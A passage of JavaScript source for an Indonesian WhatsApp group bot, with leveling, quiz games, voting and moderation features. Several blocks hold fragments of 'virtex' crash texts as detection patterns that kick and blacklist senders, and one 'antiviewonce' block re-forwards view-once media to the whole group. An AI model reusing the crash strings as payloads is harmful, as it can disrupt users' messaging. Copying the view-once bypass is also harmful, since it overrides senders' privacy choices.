 }



 if(time2 < "11:00:00"){



var ucapanWaktu = 'Good morning'



 }



 if(time2 < "05:00:00"){



var ucapanWaktu = 'Good Night'



 }



 const levelRole = level.getLevelingLevel(sender, _level)



 var role = 'Warrior III'



 if (levelRole <= 5) {



role = 'Warrior II'



 } else if (levelRole <= 10) {



role = 'Warrior I'



 } else if (levelRole <= 15) {



role = 'Elite III'



 } else if (levelRole <= 20) {



role = 'Elite II'



 } else if (levelRole <= 25) {



role = 'Elite I'



 } else if (levelRole <= 30) {



role = 'Master III'



 } else if (levelRole <= 35) {



role = 'Master II'



 } else if (levelRole <= 40) {



role = 'Master I'



 } else if (levelRole <= 45) {



role = 'GrandMaster III'



 } else if (levelRole <= 50) {



role = 'GrandMaster II'



 } else if (levelRole <= 55) {



role = 'GrandMaster I'



 } else if (levelRole <= 60) {



role = 'Epic III'



 } else if (levelRole <= 65) {



role = 'Epic II'



 } else if (levelRole <= 70) {



role = 'Epic I'



 } else if (levelRole <= 75) {



role = 'Legend III'



 } else if (levelRole <= 80) {



role = 'Legend II'



 } else if (levelRole <= 85) {



role = 'Legend I'



 } else if (levelRole <= 90) {



role = 'Mythic'



 } else if (levelRole <= 95) {



role = 'Mythical Glory'



 } else if (levelRole >= 100) {



role = 'Immortal'



 }







////< DAFTAR BUTTON BY follow @achyrr_wann > ////







const daftar1 = `Hai kak  ${pushname} ${ucapanWaktu} Kamu Belum Terdaftar Didatabase ${botName}  \n Silahkan Ikuti Panduan nya Oke `

const daftar2 = '```Klik Tombol Dibawah Apa Bila Tidak Ada Ketik .verify```'



const daftar3 = [{buttonId: noprefix ? "verify" : "!"+"verify",buttonText: {displayText: `⬡ DAFTAR `,},type: 1,},]



const nomenu = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText: {displayText: `⬡ MENU `,},type: 1,},]

///////< PREMIUM BUTTON BY IKY > ////////


const allmenu1 = `Hai kak  ${pushname} ${ucapanWaktu} \n\nSebelum Menggunakan ${botName} Baca Dulu Ya Rules nya `
const allmenu2 = '```Ketik Tombol Di Bawah Untuk Fitur Kami\nWann Official```'
const allmenu3 = [{buttonId: noprefix ? "verify" : "!"+"verify",buttonText: {displayText: `⬡ DAFTAR `,},type: 1,},{buttonId: noprefix ? "menu" : "!"+"menu",buttonText: {displayText: `⬡ MENU `,},type: 1,},]
///////< PREMIUM BUTTON BY IKY > ////////



const prem1 = `Hai kak  ${pushname} ${ucapanWaktu} \n\n Fitur Ini Khusus Member Premium Silahkan Buy Premium Untuk Menggunakan Fitur Ini `



const prem2 = '```KLIK TOMBOL DI BAWAH UNTUK MELIHAT LIST PREMIUM\n follow @achyrr_wann```'



const prem3 = [{buttonId: noprefix ? "sewabot" : "!"+"sewabot",buttonText: {displayText: `⬡ BUY PREMIUM `,},type: 1,},]



//////< FUNCTION LEVELING > ///////



if (isGroup && !wan.key.fromMe && !level.isGained(sender) && isLevelingOn) {



  try {



 level.addCooldown(sender)



 const checkATM = atm.checkATMuser(sender, _uang)



 if (checkATM === undefined) atm.addATM(sender, _uang)



const uangsaku = Math.floor(Math.random() * (15 - 25 + 1) + 20)



 atm.addKoinUser(sender, uangsaku, _uang)



 const currentLevel = level.getLevelingLevel(sender, _level)



 const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 20)



 const requiredXp = 10 * Math.pow(currentLevel, 2) + 50 * currentLevel + 100



 level.addLevelingXp(sender, amountXp, _level)



 if (requiredXp <= level.getLevelingXp(sender, _level)) {



level.addLevelingLevel(sender, 1, _level)



const userLevel = level.getLevelingLevel(sender, _level)



const fetchXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100



reply(`*「 LEVEL UP 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${level.getLevelingXp(sender, _level)} / ${fetchXp}\n➸ *Level :* ${currentLevel} -> ${level.getLevelingLevel(sender, _level)} 🆙 \n➸ *Role*: *${role}*\n\nCongrats!! 🎉🎉`)



 } 



  } catch (err) {



 console.error(err)



  }



}



colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']



const { quotedMsg, isQuotedMsg, isBaileys } = wan



const isMedia = (type === 'imageMessage' || type === 'videoMessage')



const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')



const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')



const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')



const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')



const isVideo = (type === 'videoMessage')



const isSticker = (type == 'stickerMessage')



const isListMsg = (type == 'listResponseMessage')



const isQuotedemage = isQuotedMsg ? (quotedMsg.type === 'imageMessage') ? true : false : false



const isQuotediudio = isQuotedMsg ? (quotedMsg.type === 'audioMessage') ? true : false : false



const isQuotedoideo = isQuotedMsg ? (quotedMsg.type === 'videoMessage') ? true : false : false



const isQuotedpticker = isQuotedMsg ? (quotedMsg.type === 'stickerMessage') ? true : false : false



var countDownDate = new Date("2021-08-13").getTime();
   var now = new Date().getTime();
   var distance = countDownDate - now;
   var dayss = Math.floor(distance / (1000 * 60 * 60 * 24));
   var hourss = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
   var minutess = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
   var secondss = Math.floor((distance % (1000 * 60)) / 1000);
   ultahku = `${dayss} Hari ${hourss} Jam ${minutess} Menit ${secondss} Detik`
              //stat = public ? 'PUBLIC': 'SELF'
//********** WAKTU **********/
jam = moment.tz('Asia/Jakarta').format('HH:mm')
wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
ultah = new Date('2021','12','06').valueOf()
tungmun = moment(ultah - Date.now()).format('DD [Hari], HH [Jam], mm [Menit], ss [Detik]')
//=========================================================================
global.config = {
     unvoke: true,
     unvokeMe: false
 }
 moment.tz.setDefault('Asia/Jakarta').locale('id')  



///////// < Anti link > /////////







const createSerial = (size) => {



  return crypto.randomBytes(size).toString('hex').slice(0, size)
}

if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
  if (budy.match(/(https:\/\/chat.whatsapp.com)/gi)) {
 reply(`*「 GROUP LINK DETECTOR 」*\n\n karena kamu melanggar aturan group, yaitu menggirim link group kamu akan di kick dari group!`)
 wann.groupRemove(from, [sender])
  }
  }
//=====================================================================                       
if (budy.includes("๒๒")){
  if (!isGroup) return
  if (!isAntiFirtex) return
  if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
         wann.updatePresence(from, Presence.composing)
         rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}
//=====================================================================
if (budy.includes("🧙‍♂️𝐀𝐥𝐚𝐤𝐚𝐳𝐚𝐦🔮")){
  if (!isGroup) return
  if (!isAntiFirtex2) return
  if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
   wann.updatePresence(from, Presence.composing)
  rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}     
//===================================================================== 
if (budy.includes("𝐗-𝐕𝐢𝐫𝐮𝐬")){
  if (!isGroup) return
  if (!isAntifirtex3) return
  if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
         wann.updatePresence(from, Presence.composing)
  rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}
//====================================================================================
if (budy.includes("*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ")){
  if (!isGroup) return
  if (!isAntifirtex4) return
  if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
         wann.updatePresence(from, Presence.composing)
  rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}
//====================================================================================
if (budy.includes("𝐂𝐎𝐋𝐎𝐒𝐒𝐀𝐋 𝐓𝐈𝐓𝐀𝐍")){
  if (!isGroup) return
  if (!isAntifirtex5) return
  if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
         wann.updatePresence(from, Presence.composing)
  rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}
//====================================================================================
if (budy.includes("♚㜸ཽཽࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ͢͢㜺ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ㜸ཽཽཽ͢͢͢♚")){
  if (!isGroup) return
  if (!isAntifirtex6) return
  if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
         wann.updatePresence(from, Presence.composing)
  rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}
//====================================================================================
if (budy.includes("9999999")){
  if (!isGroup) return
  if (!isAntifirtex7) return
  if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
         wann.updatePresence(from, Presence.composing)
  rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}

//================================================================================================
if (isGroup && isBadword && !isOwner && !isGroupAdmins && !fromMe){
  for (let kasar of badword){
      if (chats.toLowerCase().includes(kasar)){
          if (isCountKasar(sender, senbadword)){
              if (!isBotGroupAdmins) return reply(`Kamu beruntung karena bot bukan admin`)
              reply(`*「 ANTI BADWORD 」*\n\nSepertinya kamu sudah berkata kasar lebih dari 5x, maaf kamu akan di kick`)
              wann.groupRemove(from, [sender])
              delCountKasar(sender, senbadword)
          } else {
              addCountKasar(sender, senbadword)
              reply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick`)
          }
      }
  }
}
if (fs.existsSync('./lib/vote/' + from + '.json') && fs.existsSync('./lib/' + from + '.json') && isGroup) {



  if (budy.toLowerCase() === "vote") {



 var vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));



 var _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));



 var fil = vote.map((v) => v.participant);



 if (fil.includes(sender)) {



return mentions(



  "@" + sender.split("@")[0] + " Anda sudah vote",



  fil,



  true



  );



 } else {



vote.push({



  participant: sender,



  voting: "✅",



  voted: sender



});



fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));



let _p = [];



let _vote =



"*Vote* " +



"@" +



_votes[0].votes.split("@")[0] +



`\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;



for (let i = 0; i < vote.length; i++) {



  _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${



 vote[i].voting



  }\n\n`;



  _p.push(vote[i].participant);



}



_p.push(_votes[0].votes);



mentions(_vote, _p, true);



 }



  } else if (budy.toLowerCase() === "devote") {



 var vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));



 var _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));



 var fil = vote.map((v) => v.participant);



 if (fil.includes(sender)) {



return mentions(



  "@" + sender.split("@")[0] + " Anda sudah vote",



  fil,



  true



  );



 } else {



vote.push({



  participant: sender,



  voting: "❌",



  devote: sender



});



fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));



let _p = [];



let _vote =



"*Vote* " +



"@" +



_votes[0].votes.split("@")[0] +



`\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;



for (let i = 0; i < vote.length; i++) {



  _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${



 vote[i].voting



  }\n\n`;



  _p.push(vote[i].participant);



}



_p.push(_votes[0].votes);



mentions(_vote, _p, true);



 }



  }



}



/** end vote **/







if (isGroup && isAntiviewonce && type == "viewOnceMessage") {



  wann.sendMessage(from, `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`, text, {quoted: wan, contextInfo: { mentionedJid: [sender]}});



  var msg = { ...wan };



  msg.wan = wan.message.viewOnceMessage.message;



  msg.wan[Object.keys(msg.wan)[0]].viewOnce = false;



  wann.copyNForward(from, msg);



}







 // Badword



 if (isGroup && isBadword && !isOwner && !isGroupAdmins && !fromMe){



for (let kasar of badword){



  if (chats.toLowerCase().includes(kasar)){



 if (isCountKasar(sender, senbadword)){



if (!isBotGroupAdmins) return reply(`Kamu beruntung karena bot bukan admin`)



  reply(`*「 ANTI BADWORD 」*\n\nSepertinya kamu sudah berkata kasar lebih dari 5x, maaf kamu akan di kick`)



wann.groupRemove(from, [sender])



delCountKasar(sender, senbadword)



 } else {



addCountKasar(sender, senbadword)



reply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick`)



 }



  }



}



 }



 if (isGroup && isBaileys) {



if (mentioned.length >= groupMembers.length){



  if (!chats.match(/(@)/gi)) {



 mentions(`Terdeteksi @${sender.split('@')[0]} melakukan hidetag`, [sender], false)



  }



}



 }



  //// kontol 



  async function uptotele(path){



 var linknya = await tele.uploadByBuffer(fs.readFileSync(path))



 return linknya.link



  }



////////< Sewa > ////////



_sewa.expiredCheck(wann, sewa)



///////< MUTE > /////////



if (isMuted){



  if (!isGroupAdmins && !isPremium) return



}



const getWin = (userId) => {



  let position = false



  Object.keys(_win).forEach((i) => {



 if (_win[i].jid === userId) {



position = i



 }



  })



  if (position !== false) {



 return _win[position].win



  }



}



// GAME 



game.cekWaktuFam(wann, family100)



if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = tebakgambar[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var http = randomNomor(100)



 atm.addKoinUser(sender, http, _uang)



 await reply(`*_🎮 Tebak Gambar  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${http} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakgambar*`)



 delete tebakgambar[sender.split('@')[0]]



 fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))



  }



}



if (game.isfam(from, family100)) {



  var anjuy = game.getjawaban100(from, family100)



  for (let i of anjuy){



 if (budy.toLowerCase().includes(i)){



var htgmp = Math.floor(Math.random() * 20) + 1



atm.addKoinUser(sender, htgmp, _uang)



await reply(`*Jawaban benar*\n*Jawaban :* ${i}\n*Hadiah :* $${htgmp}\n*Jawaban yang blum tertebak :* ${anjuy.length - 1}`)



var anug = anjuy.indexOf(i)



anjuy.splice(anug, 1)



 }



  }



  if (anjuy.length < 1){



 wann.sendMessage(from, `Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`, text)



 family100.splice(game.getfamposi(from, family100), 1)



  }



}



if (tebakanime.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = tebakanime[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var htgmu = randomNomor(100)



 atm.addKoinUser(sender, htgmu, _uang)



 await reply(`*_🎮 Tebak Anime 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakanime*`)



 delete tebakanime[sender.split('@')[0]]



 fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))



  }



}



if (tebaklagu.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = tebaklagu[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var htpl = randomNomor(100)



 atm.addKoinUser(sender, htpl, _uang)



 await reply(`*_🎮 Tebak Lagu 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpl} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklagu*`)



 delete tebaklagu[sender.split('@')[0]]



 fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))



  }



}



if (tebaktebakan.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = tebaktebakan[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var htpu = randomNomor(100)



 atm.addKoinUser(sender, htpu, _uang)



 await reply(`*_🎮 Tebak Tebakan 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaktebakan*`)



 delete tebaktebakan[sender.split('@')[0]]



 fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))



  }



}



if (kuismath.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = kuismath[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var htcc = randomNomor(100)



 atm.addKoinUser(sender, htcc, _uang)



 await reply(`*_🎮 Kuis Matematika  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}kuismath*`)



 delete kuismath[sender.split('@')[0]]



 fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))







  }  



}



if (asahotak.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = asahotak[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var htgm = randomNomor(100)



 atm.addKoinUser(sender, htgm, _uang)



 await reply(`*_🎮 Asah Otak  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgm} 💰_\n\nIngin bermain lagi? kirim *${prefix}asahotak*`)



 delete asahotak[sender.split('@')[0]]



 fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))



  }



}



if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = caklontong[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var htgmi = randomNomor(100)



 atm.addKoinUser(sender, htgmi, _uang)



 await reply(`*_🎮 Caklontong  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmi} 💰_\n\nIngin bermain lagi? kirim *${prefix}caklontong*`)



 delete caklontong[sender.split('@')[0]]



 fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))



  }



}



if (tebakjenaka.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = tebakjenaka[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var htgmuu = randomNomor(100)



 atm.addKoinUser(sender, htgmuu, _uang)



 await reply(`*_🎮 Tebak Jenaka  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmuu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakjenaka*`)



 delete tebakjenaka[sender.split('@')[0]]



 fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))



  }



}



if (tebaklirik.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = tebaklirik[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var htgmii = randomNomor(100)



 atm.addKoinUser(sender, htgmii, _uang)



 await reply(`*_🎮 Tebak Lirik 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmii} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklirik*`)



 delete tebaklirik[sender.split('@')[0]]



 fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))



  }



}



if (tebakimia.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = tebakimia[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var htgmcc = randomNomor(100)



 atm.addKoinUser(sender, htgmcc, _uang)



 await reply(`*_🎮 Tebak Kimia ??_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkimia*`)



 delete tebakimia[sender.split('@')[0]]



 fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))



  }



}



if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = tebaksiapaaku[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var htgmk = randomNomor(100)



 atm.addKoinUser(sender, htgmk, _uang)



 await reply(`*_🎮 Tebak Siapakah Aku  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmk} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaksiapaaku*`)



 delete tebaksiapaaku[sender.split('@')[0]]



 fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))



  }



}



if (tebakbendera.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = tebakbendera[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var html = randomNomor(100)



 atm.addKoinUser(sender, html, _uang)



 await reply(`*_🎮 Tebak Bendera  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${html} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakbendera*`)



 delete tebakbendera[sender.split('@')[0]]



 fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))



  }



}



if (susunkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = susunkata[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var htmp = randomNomor(100)



 atm.addKoinUser(sender, htmp, _uang)



 await reply(`*_🎮 Susun Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmp} 💰_\n\nIngin bermain lagi? kirim *${prefix}susunkata*`)



 delete susunkata[sender.split('@')[0]]



 fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))



  }



}



if (tebakata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {



  kuis = true



  jawaban = tebakata[sender.split('@')[0]]



  if (budy.toLowerCase() == jawaban) {



 var htmu = randomNomor(100)



 atm.addKoinUser(sender, htmu, _uang)



 await reply(`*_🎮 Tebak Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkata*`)



 delete tebakata[sender.split('@')[0]]



 fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))



  }



}



const sendStickerUrl = async(to, url) => {



